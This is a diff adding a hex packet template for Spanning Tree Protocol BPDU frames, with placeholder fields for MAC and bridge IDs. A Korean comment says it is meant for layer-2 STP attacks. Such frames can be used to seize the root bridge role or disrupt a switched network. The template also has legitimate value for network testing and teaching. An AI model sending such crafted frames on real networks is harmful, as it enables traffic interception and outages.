@@ -1,0 +1,24 @@
+# STP BPDU (Spanning Tree Protocol) Packet Template
+# L2 STP 공격용
+
+# L2 :: Ethernet HEADER
+01 80 c2 00 00 00  # dst MAC: STP Multicast
+@SMAC:6            # src MAC
+00 27              # Length: 39
+
+# LLC Header
+42 42 03           # DSAP: 0x42, SSAP: 0x42, Control: 0x03
+
+# STP BPDU
+00 00              # Protocol ID: STP
+00                 # Version: 0
+00                 # BPDU Type: Configuration
+00                 # Flags
+@ROOTID:8          # Root Bridge ID (Priority + MAC)
+00 00 00 00        # Root Path Cost
+@BRIDGEID:8        # Bridge ID (Priority + MAC)
+@PORTID:2          # Port ID
+01 00              # Message Age: 256 (1 second)
+14 00              # Max Age: 5120 (20 seconds)
+02 00              # Hello Time: 512 (2 seconds)
+0f 00              # Forward Delay: 3840 (15 seconds)
